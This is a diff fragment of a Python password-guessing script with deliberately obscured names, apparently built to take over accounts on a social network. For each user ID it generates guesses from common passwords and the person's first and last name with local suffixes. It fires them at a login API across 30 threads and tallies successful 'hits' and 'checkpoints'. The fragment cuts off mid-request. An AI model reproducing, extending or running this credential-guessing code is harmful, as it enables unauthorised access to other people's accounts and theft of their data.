@@ -817,11 +817,11 @@ def gxdsfiles(gxdsfiles1):
     with ThreadPool(max_workers=30) as GOXDIES:
         for data in gxdsfiles1:
             uid = data.split("|")[0]
-            pwx = []
-            pwx.append("password")
-            pwx.append("password123")
-            pwx.append("Password")
-            pwx.append("Password123")
+            pxss = []
+            pxss.append("password")
+            pxss.append("password123")
+            pxss.append("Password")
+            pxss.append("Password123")
             nam = data.split("|")[1]
             name = nam.lower()
             try:
@@ -830,13 +830,13 @@ def gxdsfiles(gxdsfiles1):
                 if len(fxrst) < 3:
                     pass
                 else:
-                    pwx.append(nxme1)
-                    pwx.append(fxrst + "pogi")
-                    pwx.append(fxrst + "ganda")
-                    pwx.append(fxrst + "12")
-                    pwx.append(fxrst + "123")
-                    pwx.append(fxrst + "143")
-                    pwx.append(fxrst + "12345")
+                    pxss.append(nxme1)
+                    pxss.append(fxrst + "pogi")
+                    pxss.append(fxrst + "ganda")
+                    pxss.append(fxrst + "12")
+                    pxss.append(fxrst + "123")
+                    pxss.append(fxrst + "143")
+                    pxss.append(fxrst + "12345")
             except:
                 pass
             try:
@@ -845,18 +845,18 @@ def gxdsfiles(gxdsfiles1):
                 if len(lxst) < 3:
                     pass
                 else:
-                    pwx.append(nxme2)
-                    pwx.append(fxrst + lxst)
-                    pwx.append(fxrst + lxst + "123")
-                    pwx.append(fxrst + lxst + "1234")
-                    pwx.append(fxrst + lxst + "12345")
+                    pxss.append(nxme2)
+                    pxss.append(fxrst + lxst)
+                    pxss.append(fxrst + lxst + "123")
+                    pxss.append(fxrst + lxst + "1234")
+                    pxss.append(fxrst + lxst + "12345")
             except:
                 pass
 
             GOXDIES.submit(
                 gxds_files,
                 uid,
-                pwx,
+                pxss,
             )
 
 
@@ -866,7 +866,7 @@ oks = []
 cps = []
 
 # API
-def gxds_files(uid, pwx):
+def gxds_files(uid, pxss):
     global oks, loop, cps
     sys.stdout.write(
         f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} "
@@ -874,7 +874,7 @@ def gxds_files(uid, pwx):
     sys.stdout.flush()
     session = requests.Session()
     try:
-        for ps in pwx:
+        for ps in pxss:
             data = {
                 "adid": str(uuid.uuid4()),
                 "format": "json",
